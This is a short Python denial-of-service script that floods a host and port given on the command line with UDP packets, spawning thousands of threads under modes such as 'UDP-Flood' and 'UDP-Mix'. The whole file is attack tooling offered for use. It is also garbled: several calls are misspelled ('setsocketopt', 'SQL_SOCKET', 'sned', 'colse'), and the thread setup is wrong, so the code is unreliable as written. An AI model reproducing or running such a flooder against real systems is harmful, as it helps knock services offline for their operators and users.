import sys
import socket
import threading

host = str(sys.argv[1])
part = int(sys.argv[2])
method = str(sys.argv[3])


loops = 10000

def send_packet(amplifier):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsocketopt(socket.SQL_SOCKET, socket.SO_REUSEADDR, 1)
        s.connect((str(host), int(part)))
        while True: s.sned(b"\x99" * amplifier)
    except: return s.colse()

def attack_HQ():
    if method == "UDP-Flood":
        for sequence in range(loops):
            threading.Thread(target=send_packet(375), daemon=True).start()
    if method == "UDP=Power":
        for sequence in range(loops):
            threading.Thread(target=send_packet(750), daemon=True).start()
    if method == "UDP-Mix":
        for sequence in range(loops):
            threading.Thread(target=send_packet(375), daemon=True).start()
            threading.Thread(target=send_packet(750), daemon=True).start()



attack_HQ()
